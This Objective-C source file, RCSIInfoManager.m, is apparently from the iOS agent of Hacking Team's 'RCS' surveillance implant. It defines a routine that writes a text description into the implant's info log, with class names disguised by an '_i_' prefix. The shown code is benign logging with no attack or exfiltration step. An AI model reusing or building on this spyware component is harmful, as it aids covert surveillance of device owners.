/*
 *  RCSIInfoManager.m
 *  RCSiOS
 *
 * Created on 5/26/11.
 * Copyright 2011 HT srl. All rights reserved.
 */

#import "RCSIInfoManager.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSICommon.h"

#import "RCSILogger.h"
#import "RCSIDebug.h"


@implementation _i_InfoManager

- (BOOL)logActionWithDescription: (NSString *)description
{
  if (description == nil)
    {
      return NO;
    }

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_INFO
                           agentHeader: nil
                             withLogID: 0];

  if (success == TRUE)
    {
      NSMutableData *logData = [[NSMutableData alloc] init];
      [logData appendData: [description dataUsingEncoding:
        NSUTF16LittleEndianStringEncoding]];

      [logManager writeDataToLog: logData
                        forAgent: LOG_INFO
                       withLogID: 0];

      [logManager closeActiveLog: LOG_INFO
                       withLogID: 0];

      [logData release];
    }
  else
    {
      return NO;
    }
  
  [outerPool release];
  return YES;
}

@end

void createInfoLog(NSString *string)
{
  _i_InfoManager *infoManager = [[_i_InfoManager alloc] init];
  [infoManager logActionWithDescription: string];
  [infoManager release]; 
}